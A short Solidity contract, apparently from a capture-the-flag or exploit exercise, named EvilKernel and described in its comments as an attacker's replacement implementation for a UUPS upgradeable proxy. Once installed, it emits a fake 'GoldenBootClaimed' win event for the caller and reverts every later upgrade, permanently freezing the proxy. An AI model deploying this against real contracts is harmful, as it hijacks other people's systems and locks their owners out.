// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

/// @dev Attacker-deployed replacement kernel.  Exposes a single public
///      function `scoreGoldenBoot()` that emits the event the frontend
///      looks for.  Storage layout doesn't need to match v1 — we only
///      ever call this once via `upgradeToAndCall` and then forget it.
contract EvilKernel is UUPSUpgradeable {
    event GoldenBootClaimed(address indexed winner);

    function scoreGoldenBoot() external {
        emit GoldenBootClaimed(msg.sender);
    }

    /// @dev no-op override — once we're the impl we don't care about
    ///      further upgrades.
    function _authorizeUpgrade(address) internal pure override {
        revert("frozen");
    }
}
